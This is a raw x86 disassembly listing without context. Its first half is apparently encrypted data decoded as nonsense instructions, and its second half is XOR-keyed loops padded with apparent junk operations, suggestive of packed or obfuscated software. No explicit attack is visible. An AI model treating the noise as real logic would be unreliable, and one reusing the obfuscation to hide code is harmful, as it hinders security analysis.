  418968:	pusha  
  418969:	sub    edi,DWORD PTR [eax+0x1fb8016b]
  41896f:	xchg   ebp,eax
  418970:	pop    esp
  418971:	push   ebp
  418972:	xor    DWORD PTR ds:0xaf4624bd,ecx
  418978:	dec    ebx
  418979:	jno    0x4189ce
  41897b:	jo     0x41896e
  41897d:	or     al,0x72
  41897f:	popa   
  418980:	sub    al,0xb7
  418982:	mov    eax,ds:0xf3ec0c01
  418987:	lods   eax,DWORD PTR ds:[esi]
  418988:	call   0xa8bcfec8
  41898d:	jl     0x41897c
  41898f:	mov    dl,0x32
  418991:	push   esp
  418992:	pusha  
  418993:	xor    ah,BYTE PTR [esi]
  418995:	js     0x4189bf
  418997:	out    0x12,al
  418999:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41899a:	fsub   st(0),st
  41899c:	mov    cl,0x9c
  41899e:	mov    edx,0x2cabab12
  4189a3:	cmp    edi,DWORD PTR [edx-0x2a096369]
  4189a9:	sbb    BYTE PTR [ebp-0x6d1deb02],bl
  4189af:	mov    BYTE PTR [ebx],0xc0
  4189b2:	pop    ss
  4189b3:	pop    esp
  4189b4:	xchg   ecx,eax
  4189b5:	push   edx
  4189b6:	sub    eax,0x63664932
  4189bb:	js     0x4189dc
  4189bd:	and    al,0x79
  4189bf:	sub    eax,0xe80aafb
  4189c4:	cdq    
  4189c5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189c6:	inc    esi
  4189c7:	dec    esp
  4189c8:	fstp   TBYTE PTR [esi+0x2167693f]
  4189ce:	mov    ecx,0xdb90cfd
  4189d3:	mov    ds:0x46958f66,al
  4189d8:	ds cld 
  4189da:	xchg   edx,eax
  4189db:	adc    esi,DWORD PTR [eax+edx*4+0x7ca34253]
  4189e2:	and    eax,DWORD PTR [eax+ebp*1]
  4189e5:	mov    dl,0xcf
  4189e7:	dec    ebx
  4189e8:	inc    edx
  4189e9:	adc    DWORD PTR [edi],edx
  4189eb:	inc    ecx
  4189ec:	sbb    DWORD PTR [ecx-0x40],ecx
  4189ef:	out    0x63,al
  4189f1:	(bad)  
  4189f2:	mov    ch,0x2
  4189f4:	(bad)  
  4189f5:	imul   edx,DWORD PTR [edi],0x7b
  4189f8:	push   ebp
  4189f9:	push   cs
  4189fa:	je     0x418a18
  4189fc:	xchg   ebx,eax
  4189fd:	aad    0x7f
  4189ff:	cli    
  418a00:	bound  edx,QWORD PTR [edx+0x62]
  418a03:	arpl   WORD PTR [esp+edx*2+0x1b0a52db],di
  418a0a:	rol    esi,cl
  418a0c:	sti    
  418a0d:	mov    dl,0x66
  418a0f:	adc    DWORD PTR [eax-0x5685dc82],edx
  418a15:	int3   
  418a16:	adc    dl,BYTE PTR [ecx+0x46eac62b]
  418a1c:	lahf   
  418a1d:	iret   
  418a1e:	test   al,0x5
  418a20:	std    
  418a21:	xchg   esi,eax
  418a22:	xor    bh,bh
  418a24:	mov    dh,0xe0
  418a26:	test   BYTE PTR [ebx-0x7c31712d],bl
  418a2c:	and    BYTE PTR [ebx],0xb7
  418a2f:	mul    DWORD PTR [eax]
  418a31:	bnd jge 0x418a5f
  418a34:	jb     0x418a94
  418a36:	adc    al,0xad
  418a38:	sbb    bh,BYTE PTR [esi+edx*1+0x3d]
  418a3c:	and    bh,BYTE PTR [edi-0x13]
  418a3f:	aad    0xae
  418a41:	aad    0x88
  418a43:	(bad)  
  418a44:	adc    al,0x95
  418a46:	jmp    0x418a27
  418a48:	dec    edi
  418a49:	jbe    0x418a43
  418a4b:	and    DWORD PTR [ebx],eax
  418a4d:	xchg   bl,ch
  418a4f:	popw   ss
  418a51:	jns    0x418a40
  418a53:	fldenv [edi-0xb62bec8]
  418a59:	shl    DWORD PTR [eax],0x87
  418a5c:	sub    al,0x64
  418a5e:	(bad)  
  418a5f:	jno    0x418aa3
  418a61:	in     eax,0x61
  418a63:	pusha  
  418a64:	test   BYTE PTR [edx+0x114cf29],bl
  418a6a:	retf   0xfef5
  418a6d:	iret   
  418a6e:	adc    eax,0xee6c9e33
  418a73:	push   0xd13cd779
  418a78:	push   es
  418a79:	xchg   edi,eax
  418a7a:	ror    BYTE PTR [esi+0x70],cl
  418a7d:	icebp  
  418a7e:	push   edx
  418a7f:	fmulp  st(6),st
  418a81:	(bad)  
  418a82:	cs pop esp
  418a84:	xlat   BYTE PTR ds:[ebx]
  418a85:	xchg   ebp,eax
  418a86:	mov    eax,cr2
  418a89:	inc    edi
  418a8a:	inc    edx
  418a8b:	inc    esi
  418a8c:	ret    0x4aa6
  418a8f:	adc    eax,0xa0950c5d
  418a94:	je     0xb6c78245
  418a9a:	xor    eax,0x4b4165bc
  418a9f:	jle    0x418b06
  418aa1:	or     DWORD PTR [esi+0x2c],ecx
  418aa4:	xor    BYTE PTR [ebp+0x64],ah
  418aa7:	push   eax
  418aa8:	in     al,0x9e
  418aaa:	jge    0x418adf
  418aac:	out    dx,al
  418aad:	(bad)  
  418aae:	out    dx,al
  418aaf:	mov    dl,0x29
  418ab1:	adc    eax,0x5dd656f1
  418ab6:	pop    ecx
  418ab7:	retf   0x146d
  418aba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418abb:	mov    ah,0xd0
  418abd:	push   0xb0d17b10
  418ac2:	cmc    
  418ac3:	das    
  418ac4:	push   ebp
  418ac5:	adc    al,BYTE PTR [ebp-0x46]
  418ac8:	daa    
  418ac9:	and    BYTE PTR [eax+0x21d92f10],0xcb
  418ad0:	outs   dx,BYTE PTR ds:[esi]
  418ad1:	mov    DWORD PTR [esi-0x28df9347],esp
  418ad7:	mov    ecx,0x56c8ccce
  418adc:	xchg   esi,eax
  418add:	pop    ecx
  418ade:	push   ss
  418adf:	(bad)  
  418ae0:	into   
  418ae1:	jg     0x418aee
  418ae3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418ae4:	dec    esi
  418ae5:	sahf   
  418ae6:	sub    al,0x43
  418ae8:	pop    ebx
  418ae9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418aea:	and    edi,edx
  418aec:	jp     0x418aac
  418aee:	(bad)  
  418aef:	ins    BYTE PTR es:[edi],dx
  418af0:	sub    DWORD PTR [esi],edi
  418af2:	out    0x6b,eax
  418af4:	mov    dh,0x26
  418af6:	mov    ss,WORD PTR [eax]
  418af8:	push   esp
  418af9:	fnstenv [ecx]
  418afb:	fs out dx,al
  418afd:	fst    QWORD PTR [esi+0x3c]
  418b00:	or     DWORD PTR [edx+0x3bf3df88],eax
  418b06:	pop    eax
  418b07:	pop    ebx
  418b08:	mov    BYTE PTR [ecx+0xe0ff47e],bh
  418b0e:	push   ebx
  418b0f:	cmp    dh,BYTE PTR [eax]
  418b11:	inc    BYTE PTR [edx+0x74fad6b0]
  418b17:	or     ecx,DWORD PTR [esi]
  418b19:	mov    ah,0x41
  418b1b:	outs   dx,BYTE PTR ds:[esi]
  418b1c:	inc    ebp
  418b1d:	push   esi
  418b1e:	test   eax,0x457c8cae
  418b23:	sbb    al,0xc4
  418b25:	fld    TBYTE PTR [ebx+ebp*1-0x6d]
  418b29:	add    eax,0x4a50a307
  418b2e:	lahf   
  418b2f:	adc    dh,0x88
  418b32:	jmp    0x418ac6
  418b34:	push   0xfffffff2
  418b36:	xchg   edx,eax
  418b37:	stc    
  418b38:	out    dx,eax
  418b39:	mov    cl,0x2f
  418b3b:	push   DWORD PTR [ebx+0x48d2bf4]
  418b41:	rcr    DWORD PTR [ebx+eax*2],1
  418b44:	jge    0x418ba2
  418b46:	pusha  
  418b47:	xor    BYTE PTR [ebp-0x59],bh
  418b4a:	xlat   BYTE PTR ds:[ebx]
  418b4b:	test   BYTE PTR [ebx],0xfe
  418b4e:	jge    0x418b27
  418b50:	fwait
  418b51:	stos   BYTE PTR es:[edi],al
  418b52:	pop    ecx
  418b53:	xchg   esi,eax
  418b54:	addr16 and eax,0xda97daa9
  418b5a:	mov    WORD PTR [edx-0x61],ds
  418b5d:	push   esi
  418b5e:	fdivr  QWORD PTR [edi+0x4e]
  418b61:	mov    eax,0x32f4731b
  418b66:	fisub  WORD PTR [esi+eax*8+0x8]
  418b6a:	add    al,0xf
  418b6c:	or     eax,0x545ef55e
  418b71:	xchg   ebp,eax
  418b72:	hlt    
  418b73:	mov    dl,0x3
  418b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418b76:	int    0xf1
  418b78:	sbb    al,0x6b
  418b7a:	lods   al,BYTE PTR ds:[esi]
  418b7b:	shr    DWORD PTR [eax],1
  418b7d:	ds stos DWORD PTR es:[edi],eax
  418b7f:	lahf   
  418b80:	jne    0x418baf
  418b82:	jg     0x418bb7
  418b84:	ins    BYTE PTR es:[edi],dx
  418b85:	(bad)  
  418b86:	mov    al,ds:0x718a5340
  418b8b:	ja     0x418b31
  418b8d:	jmp    0x5852:0xaa5f7c83
  418b94:	retf   0x1644
  418b97:	retf   0xec6
  418b9a:	outs   dx,DWORD PTR ds:[esi]
  418b9b:	add    BYTE PTR [ebx],bh
  418b9d:	push   esp
  418b9e:	in     eax,dx
  418b9f:	(bad)  
  418ba0:	retf   
  418ba1:	pop    edi
  418ba2:	fiadd  DWORD PTR [ebp+0x1f]
  418ba5:	inc    esp
  418ba6:	cmp    al,0x98
  418ba8:	fld    QWORD PTR ds:0x1978d618
  418bae:	xlat   BYTE PTR ds:[ebx]
  418baf:	(bad)  
  418bb0:	arpl   di,ax
  418bb2:	enter  0xb7e6,0xdd
  418bb6:	add    eax,0x41d5b201
  418bbb:	inc    ecx
  418bbc:	adc    edx,DWORD PTR [ebx]
  418bbe:	jge    0x418c36
  418bc0:	ins    DWORD PTR es:[edi],dx
  418bc1:	mov    esp,0xfe22320
  418bc6:	out    dx,eax
  418bc7:	sbb    eax,0xf38eec7d
  418bcc:	jmp    0x418c40
  418bce:	ret    
  418bcf:	mov    eax,ds:0x88484ae1
  418bd4:	xor    al,0xf8
  418bd6:	xchg   ebx,eax
  418bd7:	pop    ebp
  418bd8:	push   0x8
  418bda:	dec    edx
  418bdb:	scas   al,BYTE PTR es:[edi]
  418bdc:	push   ebx
  418bdd:	inc    edx
  418bde:	retf   0x58c7
  418be1:	add    DWORD PTR [ebx],ecx
  418be3:	lods   al,BYTE PTR ds:[esi]
  418be4:	les    ecx,FWORD PTR [ebx]
  418be6:	(bad)  [edx-0xaa81987]
  418bec:	std    
  418bed:	inc    eax
  418bee:	mov    DWORD PTR [eax-0x1cde8bd],esi
  418bf4:	aas    
  418bf5:	push   0xfffffff1
  418bf7:	pop    ebp
  418bf8:	mov    dl,0xe0
  418bfa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418bfb:	lods   eax,DWORD PTR ds:[esi]
  418bfc:	jmp    0x48c743cf
  418c01:	sub    ecx,edi
  418c03:	pop    ebp
  418c04:	sub    edx,DWORD PTR [ebp-0x33]
  418c07:	lods   eax,DWORD PTR ds:[esi]
  418c08:	mov    BYTE PTR [edi+0x20],ch
  418c0b:	shr    DWORD PTR [ebx-0x5993eb62],cl
  418c11:	lea    edi,[ebp+0x14ac7b09]
  418c17:	dec    edi
  418c18:	xor    DWORD PTR [eax],ebx
  418c1a:	xchg   ecx,eax
  418c1b:	fnstenv [ebx+0xc]
  418c1e:	sub    al,0x7d
  418c20:	mov    dh,0xa4
  418c22:	or     DWORD PTR [ebp-0x5],ecx
  418c25:	or     eax,0xe4c646e5
  418c2a:	dec    edx
  418c2b:	out    dx,eax
  418c2c:	pusha  
  418c2d:	mov    cl,0x81
  418c2f:	jg     0x418c18
  418c31:	ficom  DWORD PTR [esi+0x0]
  418c34:	and    DWORD PTR [esi+0x3cf5c784],edx
  418c3a:	cmp    ch,BYTE PTR [ebp+edx*1+0x6d]
  418c3e:	add    DWORD PTR [edx-0x304df8dc],esp
  418c44:	aas    
  418c45:	dec    edx
  418c46:	fdiv   st(2),st
  418c48:	mov    WORD PTR [edx+0x67],gs
  418c4b:	std    
  418c4c:	jge    0x418c82
  418c4e:	mov    al,0x3c
  418c50:	imul   esi,DWORD PTR [edx+0x6c41a521],0xfffffffc
  418c57:	xchg   edx,eax
  418c58:	(bad)  
  418c59:	xchg   edi,eax
  418c5a:	jle    0x418ca6
  418c5c:	dec    DWORD PTR [edx]
  418c5e:	mov    WORD PTR [ebx+0x2891b514],cs
  418c64:	mov    BYTE PTR [edx+0x4892330e],bh
  418c6a:	xor    eax,0x1724dfb3
  418c6f:	call   0x9bf81753
  418c74:	push   ds
  418c75:	xor    ecx,0x8a64ca97
  418c7b:	or     al,BYTE PTR [eax+0x8]
  418c7e:	sbb    al,0x97
  418c80:	sub    eax,0x425892e
  418c85:	cld    
  418c86:	push   edi
  418c87:	push   eax
  418c88:	(bad)  
  418c89:	in     eax,0xc7
  418c8b:	(bad)  
  418c8c:	inc    ecx
  418c8d:	xchg   ebx,eax
  418c8e:	mov    ds:0xc489c07,al
  418c93:	dec    ebx
  418c94:	xor    eax,0xe7c29700
  418c99:	xchg   ebp,eax
  418c9a:	fstp   TBYTE PTR [ebp-0x5]
  418c9d:	jge    0x418d19
  418c9f:	xchg   esp,edi
  418ca1:	jl     0x418c29
  418ca3:	cmp    ah,al
  418ca5:	mov    dl,0x57
  418ca7:	dec    ebx
  418ca8:	add    esi,ecx
  418caa:	pusha  
  418cab:	dec    ebx
  418cac:	pop    eax
  418cad:	(bad)  
  418cae:	mov    al,0xd1
  418cb0:	and    dh,ch
  418cb2:	out    dx,eax
  418cb3:	and    cl,dh
  418cb5:	daa    
  418cb6:	pop    esi
  418cb7:	ja     0x418d03
  418cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418cba:	hlt    
  418cbb:	jns    0x418c6e
  418cbd:	jl     0x418ca7
  418cbf:	mov    BYTE PTR [esi-0x4e673cc4],al
  418cc5:	mov    ebx,0xedc026a4
  418cca:	les    ecx,FWORD PTR [eax-0xf]
  418ccd:	mov    ebp,DWORD PTR [eax]
  418ccf:	cmp    DWORD PTR [edx],ebp
  418cd1:	inc    edx
  418cd2:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418cd4:	daa    
  418cd5:	aas    
  418cd6:	enter  0x2101,0x84
  418cda:	mov    BYTE PTR [ebx],0x3d
  418cdd:	pop    esp
  418cde:	test   DWORD PTR [edi],eax
  418ce0:	add    DWORD PTR [ebp+0x15],esi
  418ce3:	push   ebx
  418ce4:	lods   al,BYTE PTR gs:[esi]
  418ce6:	pop    edx
  418ce7:	jmp    0x10ec:0xaade963d
  418cee:	jne    0x418d0d
  418cf0:	xor    ah,BYTE PTR [ecx+0x534d9b06]
  418cf6:	fsubr  DWORD PTR [eax+esi*8-0x4cd852d7]
  418cfd:	xchg   esp,eax
  418cfe:	dec    esi
  418cff:	icebp  
  418d00:	(bad)  
  418d01:	cmp    eax,0xc8d71429
  418d06:	iret   
  418d07:	stc    
  418d08:	mov    fs,WORD PTR [eax-0x22]
  418d0b:	in     al,0x46
  418d0d:	je     0x418d50
  418d0f:	test   eax,0xd4abe74e
  418d14:	mul    ebx
  418d16:	rol    BYTE PTR [ebp+0x157398f5],0x66
  418d1d:	stos   DWORD PTR es:[edi],eax
  418d1e:	out    0xb5,al
  418d20:	or     DWORD PTR [ebp-0x15],esi
  418d23:	ss push ebx
  418d25:	mov    bh,0xd0
  418d27:	ins    DWORD PTR es:[edi],dx
  418d28:	add    edx,DWORD PTR [ebx+ecx*2+0x11ae600d]
  418d2f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d30:	lea    esi,[edi]
  418d32:	dec    ebp
  418d33:	xlat   BYTE PTR ds:[ebx]
  418d34:	or     al,0xd4
  418d36:	push   ebp
  418d37:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418d39:	cld    
  418d3a:	and    BYTE PTR [ebx-0x75],al
  418d3d:	fst    QWORD PTR [ebx-0x5c]
  418d40:	or     eax,0xa85ad692
  418d45:	ror    bh,cl
  418d47:	or     cl,al
  418d49:	and    al,0x7
  418d4b:	pop    eax
  418d4c:	push   ebp
  418d4d:	mov    ch,0x34
  418d4f:	rol    DWORD PTR [eax],1
  418d51:	jg     0x418d47
  418d53:	retf   0x8a94
  418d56:	cli    
  418d57:	add    al,0xd8
  418d59:	fistp  QWORD PTR [edi+0x578e40bd]
  418d5f:	fld    TBYTE PTR [eax+0x47]
  418d62:	mov    eax,0x95b515c3
  418d67:	loopne 0x418cfe
  418d69:	test   DWORD PTR [esi+eiz*2+0x2a],edi
  418d6d:	mov    dl,0x22
  418d6f:	xchg   BYTE PTR [esi+ecx*8+0x1cd87f17],ah
  418d76:	fisttp WORD PTR [edi]
  418d78:	(bad)  
  418d79:	mov    eax,0x46dcbfd9
  418d7e:	ficom  DWORD PTR [ebx-0x5c]
  418d81:	mov    BYTE PTR [esi-0x3c2b33a],bl
  418d87:	ins    BYTE PTR es:[edi],dx
  418d88:	xchg   esi,eax
  418d89:	aam    0xef
  418d8b:	outs   dx,DWORD PTR ds:[esi]
  418d8c:	int    0x8f
  418d8e:	mulps  xmm0,XMMWORD PTR [edi+0x1]
  418d92:	dec    edi
  418d93:	movhps QWORD PTR [edi-0x6c],xmm5
  418d97:	adc    al,0xfb
  418d99:	addr16 mov ebp,0xc251aff4
  418d9f:	lahf   
  418da0:	jecxz  0x418d39
  418da2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418da3:	nop
  418da4:	stc    
  418da5:	scas   eax,DWORD PTR es:[edi]
  418da6:	cmp    dl,BYTE PTR [edx-0x2fc33007]
  418dac:	mov    al,ds:0xf82a99d7
  418db1:	inc    esp
  418db2:	int    0xd
  418db4:	repz and edi,ebx
  418db7:	imul   edi,edx,0x54
  418dba:	xchg   BYTE PTR [ebx+ebp*8+0x334c719],al
  418dc1:	aaa    
  418dc2:	add    ebp,eax
  418dc4:	loop   0x418db3
  418dc6:	enter  0xa3ae,0xc
  418dca:	and    al,0x7d
  418dcc:	push   edi
  418dcd:	mov    esp,0xa6f4fcee
  418dd2:	sbb    BYTE PTR [edx+0x579c392e],al
  418dd8:	cmp    al,0x1e
  418dda:	cmp    eax,0xc2ba0d92
  418ddf:	inc    ebp
  418de0:	mov    ds:0x25919db5,eax
  418de5:	adc    al,0x44
  418de7:	std    
  418de8:	out    0x26,eax
  418dea:	fadd   st,st(5)
  418dec:	mov    ecx,0xdd19cc51
  418df1:	xor    BYTE PTR [edi],al
  418df3:	fistp  DWORD PTR [edi-0xd]
  418df6:	jmp    0x48c4a875
  418dfb:	cmp    edx,DWORD PTR [edx+ebx*4]
  418dfe:	add    BYTE PTR [ecx-0x4f],al
  418e01:	aas    
  418e02:	dec    eax
  418e03:	outs   dx,BYTE PTR ds:[esi]
  418e04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418e05:	mov    esi,es
  418e07:	add    bh,BYTE PTR [esi-0x75]
  418e0a:	push   ebp
  418e0b:	lock or DWORD PTR ds:0x428e9b,0x120f
  418e16:	mov    ebx,DWORD PTR [ebp-0x8]
  418e19:	adc    DWORD PTR ds:0x428e7b,0x428ec3
  418e23:	xor    edx,eax
  418e25:	or     DWORD PTR ds:0x428ec3,0x428e27
  418e2f:	xor    ebx,eax
  418e31:	sub    edx,ebx
  418e33:	sub    edx,esi
  418e35:	sbb    DWORD PTR ds:0x428e8f,0x4a4
  418e3f:	xor    edx,eax
  418e41:	mov    DWORD PTR [ebp-0x10],edx
  418e44:	mov    edx,DWORD PTR ds:0x428e2b
  418e4a:	mov    edx,DWORD PTR [ebp-0x14]
  418e4d:	mov    DWORD PTR [ebp+0x8],edx
  418e50:	mov    DWORD PTR ds:0x428e7b,0x3079
  418e5a:	jmp    0x418fdc
  418e5f:	xor    DWORD PTR ds:0x428eb3,0x4ecc
  418e69:	mov    edx,DWORD PTR [ebp+0x8]
  418e6c:	mov    ebx,DWORD PTR [ebp-0x8]
  418e6f:	adc    DWORD PTR ds:0x428ecf,0x68d0
  418e79:	xor    edx,eax
  418e7b:	xor    ebx,eax
  418e7d:	sub    edx,ebx
  418e7f:	or     DWORD PTR ds:0x428e9b,ecx
  418e85:	sub    edx,esi
  418e87:	and    DWORD PTR ds:0x428e9f,0x0
  418e91:	jmp    0x418ea5
  418e96:	xor    ebx,ebx
  418e98:	xor    ebx,DWORD PTR ds:0x428e9f
  418e9e:	inc    ebx
  418e9f:	mov    DWORD PTR ds:0x428e9f,ebx
  418ea5:	cmp    DWORD PTR ds:0x428e9f,0x1e
  418eac:	jae    0x418eec
  418eb2:	cmp    DWORD PTR ds:0x428e9f,0xc
  418eb9:	jge    0x418eec
  418ebf:	jmp    0x418ecd
  418ec4:	push   DWORD PTR [ebp-0x18]
  418ec7:	call   DWORD PTR ds:0x42a9ff
  418ecd:	cmp    DWORD PTR ds:0x428e9f,0xb
  418ed4:	jne    0x418ee7
  418eda:	mov    ebx,DWORD PTR ds:0x428e9f
  418ee0:	inc    ebx
  418ee1:	mov    DWORD PTR ds:0x428e9f,ebx
  418ee7:	jmp    0x418e96
  418eec:	xor    edx,eax
  418eee:	mov    DWORD PTR [ebp+0x8],edx
  418ef1:	mov    edx,DWORD PTR [ebp+0x8]
  418ef4:	mov    ebx,DWORD PTR [ebp-0x58]
  418ef7:	sub    DWORD PTR ds:0x428e8f,0x48c7
  418f01:	add    edx,0x5708e4
  418f07:	and    DWORD PTR ds:0x428e2f,0x10a3
  418f11:	imul   edx,ebx
  418f14:	dec    ebx
  418f15:	mov    DWORD PTR [ebp-0x58],edx
  418f18:	adc    ebx,edx
  418f1a:	mov    edx,DWORD PTR [ebp+0x8]
  418f1d:	mov    ebx,DWORD PTR [ebp-0x54]
  418f20:	add    edx,0x64f882
  418f26:	or     edx,ebx
  418f28:	and    DWORD PTR ds:0x428e2b,edi
  418f2e:	mov    DWORD PTR [ebp-0x54],edx
  418f31:	mov    edx,DWORD PTR ds:0x428eeb
  418f37:	mov    ebx,DWORD PTR ds:0x428ef7
  418f3d:	sub    edx,ebx
  418f3f:	xor    edx,DWORD PTR [edx+ebx*1]
  418f42:	mov    edx,DWORD PTR [ebp+0x8]
  418f45:	mov    DWORD PTR ds:0x428ec3,0x13
  418f4f:	cmp    DWORD PTR ds:0x428ec3,0x0
  418f56:	je     0x418fa5
  418f5c:	cmp    DWORD PTR ds:0x428ec3,0x2
  418f63:	jl     0x418fa5
  418f69:	jmp    0x418f79
  418f6e:	push   0x4281a7
  418f73:	call   DWORD PTR ds:0x42aa03
  418f79:	cmp    DWORD PTR ds:0x428ec3,0x3
  418f80:	jne    0x418f93
  418f86:	mov    ebx,DWORD PTR ds:0x428ec3
  418f8c:	dec    ebx
  418f8d:	mov    DWORD PTR ds:0x428ec3,ebx
  418f93:	mov    ebx,DWORD PTR ds:0x428ec3
  418f99:	dec    ebx
  418f9a:	mov    DWORD PTR ds:0x428ec3,ebx
  418fa0:	jmp    0x418f4f
  418fa5:	mov    ebx,DWORD PTR [ebp-0x50]
  418fa8:	add    edx,ecx
  418faa:	xor    edx,ebx
  418fac:	mov    DWORD PTR [ebp-0x50],edx
  418faf:	mov    edx,DWORD PTR [ebp+0x8]
  418fb2:	mov    ebx,DWORD PTR [ebp-0x4c]
  418fb5:	add    edx,edi
  418fb7:	and    edx,ebx
  418fb9:	mov    DWORD PTR [ebp-0x4c],edx
  418fbc:	mov    edx,DWORD PTR [ebp+0x8]
  418fbf:	mov    ebx,DWORD PTR [ebp-0x48]
  418fc2:	lea    edx,[ebx+edx*1+0x241fcdf]
  418fc9:	mov    DWORD PTR [ebp-0x48],edx
  418fcc:	mov    edx,DWORD PTR [ebp+0x8]
  418fcf:	mov    ebx,0xfa5e1522
  418fd4:	sub    ebx,edx
  418fd6:	add    ebx,DWORD PTR [ebp-0x44]
  418fd9:	mov    DWORD PTR [ebp-0x44],ebx
  418fdc:	mov    edx,DWORD PTR [ebp+0x8]
  418fdf:	xor    edx,eax
  418fe1:	add    edx,esi
  418fe3:	jne    0x418e5f
  418fe9:	mov    edx,DWORD PTR [ebp-0xc]
  418fec:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  418ff3:	mov    bl,BYTE PTR [ebp-0x1]
  418ff6:	cmp    dl,bl
  418ff8:	je     0x4190d6
  418ffe:	mov    ecx,DWORD PTR [ebp-0x5c]
  419001:	mov    edx,DWORD PTR [ebp-0xc]
  419004:	mov    dl,BYTE PTR [ebp+edx*1-0x9c]
  41900b:	mov    ebx,DWORD PTR [ebp+0xc]
  41900e:	xor    ecx,eax
  419010:	cmp    dl,BYTE PTR [ebx+ecx*1+0x3272f6]
  419017:	jne    0x41920a
  41901d:	mov    ecx,DWORD PTR [ebp-0x5c]
  419020:	mov    edx,DWORD PTR [ebp+0xc]
  419023:	xor    ecx,eax
  419025:	movsx  ecx,BYTE PTR [edx+ecx*1+0x3272f6]
  41902d:	mov    edx,DWORD PTR [ebp-0x18]
  419030:	xor    edx,eax
  419032:	add    edx,esi
  419034:	cmp    ecx,edx
  419036:	mov    ecx,DWORD PTR [ebp-0x14]
  419039:	mov    DWORD PTR [ebp+0x8],ecx
  41903c:	mov    ecx,DWORD PTR [ebp+0x8]
  41903f:	je     0x419312
  419045:	xor    ecx,eax
  419047:	add    ecx,esi
  419049:	mov    ecx,0x242ebf1
  41904e:	je     0x41915e
  419054:	mov    edx,DWORD PTR [ebp+0x8]
  419057:	mov    ebx,DWORD PTR [ebp-0x8]
  41905a:	xor    edx,eax
  41905c:	xor    ebx,eax
  41905e:	sub    edx,ebx
  419060:	sub    edx,esi
  419062:	xor    edx,eax
  419064:	mov    DWORD PTR [ebp+0x8],edx
  419067:	mov    edx,DWORD PTR [ebp+0x8]
  41906a:	mov    ebx,DWORD PTR [ebp-0x58]
  41906d:	add    edx,0x5708e4
  419073:	imul   edx,ebx
  419076:	mov    DWORD PTR [ebp-0x58],edx
  419079:	mov    edx,DWORD PTR [ebp+0x8]
  41907c:	mov    ebx,DWORD PTR [ebp-0x54]
  41907f:	add    edx,0x64f882
  419085:	or     edx,ebx
  419087:	mov    DWORD PTR [ebp-0x54],edx
  41908a:	mov    edx,DWORD PTR [ebp+0x8]
  41908d:	mov    ebx,DWORD PTR [ebp-0x50]
  419090:	add    edx,ecx
  419092:	xor    edx,ebx
  419094:	mov    DWORD PTR [ebp-0x50],edx
  419097:	mov    edx,DWORD PTR [ebp+0x8]
  41909a:	mov    ebx,DWORD PTR [ebp-0x4c]
  41909d:	add    edx,edi
  41909f:	and    edx,ebx
  4190a1:	mov    DWORD PTR [ebp-0x4c],edx
  4190a4:	mov    edx,DWORD PTR [ebp+0x8]
  4190a7:	mov    ebx,DWORD PTR [ebp-0x48]
  4190aa:	lea    edx,[ebx+edx*1+0x241fcdf]
  4190b1:	mov    DWORD PTR [ebp-0x48],edx
  4190b4:	mov    edx,DWORD PTR [ebp+0x8]
  4190b7:	mov    ebx,0xfa5e1522
  4190bc:	sub    ebx,edx
  4190be:	add    ebx,DWORD PTR [ebp-0x44]
  4190c1:	mov    DWORD PTR [ebp-0x44],ebx
  4190c4:	mov    edx,DWORD PTR [ebp+0x8]
  4190c7:	xor    edx,eax
  4190c9:	add    edx,esi
  4190cb:	jne    0x419054
  4190d1:	jmp    0x41915e
  4190d6:	mov    edx,DWORD PTR [ebp-0x14]
  4190d9:	mov    DWORD PTR [ebp+0x8],edx
  4190dc:	jmp    0x419151
  4190e1:	mov    edx,DWORD PTR [ebp+0x8]
  4190e4:	mov    ebx,DWORD PTR [ebp-0x8]
  4190e7:	xor    edx,eax
  4190e9:	xor    ebx,eax
  4190eb:	sub    edx,ebx
  4190ed:	sub    edx,esi
  4190ef:	xor    edx,eax
  4190f1:	mov    DWORD PTR [ebp+0x8],edx
  4190f4:	mov    edx,DWORD PTR [ebp+0x8]
  4190f7:	mov    ebx,DWORD PTR [ebp-0x58]
  4190fa:	add    edx,0x5708e4
  419100:	imul   edx,ebx
  419103:	mov    DWORD PTR [ebp-0x58],edx
  419106:	mov    edx,DWORD PTR [ebp+0x8]
  419109:	mov    ebx,DWORD PTR [ebp-0x54]
  41910c:	add    edx,0x64f882
  419112:	or     edx,ebx
  419114:	mov    DWORD PTR [ebp-0x54],edx
  419117:	mov    edx,DWORD PTR [ebp+0x8]
  41911a:	mov    ebx,DWORD PTR [ebp-0x50]
  41911d:	add    edx,ecx
  41911f:	xor    edx,ebx
  419121:	mov    DWORD PTR [ebp-0x50],edx
  419124:	mov    edx,DWORD PTR [ebp+0x8]
  419127:	mov    ebx,DWORD PTR [ebp-0x4c]
  41912a:	add    edx,edi
  41912c:	and    edx,ebx
  41912e:	mov    DWORD PTR [ebp-0x4c],edx
  419131:	mov    edx,DWORD PTR [ebp+0x8]
  419134:	mov    ebx,DWORD PTR [ebp-0x48]
  419137:	lea    edx,[ebx+edx*1+0x241fcdf]
  41913e:	mov    DWORD PTR [ebp-0x48],edx
  419141:	mov    edx,DWORD PTR [ebp+0x8]
  419144:	mov    ebx,0xfa5e1522
  419149:	sub    ebx,edx
  41914b:	add    ebx,DWORD PTR [ebp-0x44]
  41914e:	mov    DWORD PTR [ebp-0x44],ebx
  419151:	mov    edx,DWORD PTR [ebp+0x8]
  419154:	xor    edx,eax
  419156:	add    edx,esi
  419158:	jne    0x4190e1
  41915e:	mov    edx,DWORD PTR [ebp-0x14]
  419161:	mov    DWORD PTR [ebp+0x8],edx
  419164:	jmp    0x4191d9
  419169:	mov    edx,DWORD PTR [ebp+0x8]
  41916c:	mov    ebx,DWORD PTR [ebp-0x8]
  41916f:	xor    edx,eax
  419171:	xor    ebx,eax
  419173:	sub    edx,ebx
  419175:	sub    edx,esi
  419177:	xor    edx,eax
  419179:	mov    DWORD PTR [ebp+0x8],edx
